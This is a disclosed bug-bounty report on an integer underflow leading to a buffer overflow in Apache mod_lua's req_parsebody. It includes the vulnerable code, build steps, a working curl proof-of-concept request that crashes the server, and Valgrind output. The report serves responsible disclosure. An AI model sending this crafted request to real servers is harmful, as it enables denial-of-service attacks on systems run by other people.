# Buffer overflow in req_parsebody method in lua_request.c

## Report Details
- **Report ID**: 1434056
- **URL**: https://hackerone.com/reports/1434056
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-12-22T13:20:52.665Z
- **Disclosed**: 2022-01-04T15:31:01.108Z

## Reporter
- **Username**: chamal
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Software Versions
-------------------
Ubuntu - 18.04 (32-bit)
Apache 2.4.51 (32-bit)

Description
-------------
This bug is present in "req_parsebody" method of modules/lua/lua_request.c file.
Below mentioned lines of code cause this bug.

```cpp
  ...
  size_t  vlen = 0;
  ...
  ...
  vlen = end - crlf - 8;
  buffer = (char *) apr_pcalloc(r->pool, vlen+1);
  memcpy(buffer, crlf + 4, vlen);
  ...
```

Above code does not check whether the result of (end - crlf) is greater than or equal to 8.
So it is possible to make the result of (end - crlf - 8), negative.
Sending this HTTP request causes the result to be -1.
   `curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\r\n\r\naaa-' http://127.0.0.1/test.lua`

Since "vlen" is of type "size_t", -1 will become 4294967295. This is the maximum value of size_t data type in 32 bit systems.
Then vlen+1 is passed to apr_pcalloc method.
So the actual size allocated is 0.
Since the allocated buffer is too small there will be an overflow and crash in next memcpy statement.

Steps to Reproduce
--------------------
1.  Build Apache web server with Lua module
   ./configure --enable-lua=shared
   make
   make install 

2.  Enable Lua module with Apache web server.
    Add these lines to httpd.conf file.
 ```
   LoadModule lua_module modules/mod_lua.so
   <Files "*.lua">
    SetHandler lua-script
   </Files>
 ```
3. Copy attached F1555487 file to htdocs folder.

4. Start Apache web server in debug single worker mode.
   `./httpd -X -d /home/apache/install-directory/`

5. Send this HTTP request with CURL.
    `curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\r\n\r\naaa-' http://127.0.0.1/test.lua`
    Apache web server will crash.

Valgrind Output
----------------
Command: valgrind ./httpd -X -d /home/apache/install-directory/

 Invalid write of size 1
 at 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
 by 0x501355B: req_parsebody (lua_request.c:415)
 by 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x500D02B: lua_handler (mod_lua.c:323)
 by 0x15F9E4: ap_run_handler (config.c:169)
 by 0x16040C: ap_invoke_handler (config.c:443)
 Address 0x12aec000 is not stack'd, malloc'd or (recently) free'd

 Process terminating with default action of signal 11 (SIGSEGV)
 Access not within mapped region at address 0x12AEC000
 at 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
 by 0x501355B: req_parsebody (lua_request.c:415)
 by 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
 by 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)
by 0x500D02B: lua_handler (mod_lua.c:323)
by 0x15F9E4: ap_run_handler (config.c:169)
 by 0x16040C: ap_invoke_handler (config.c:443)

## Impact

May be possible to use in a denial of service attack.

## Attachments
- test.lua
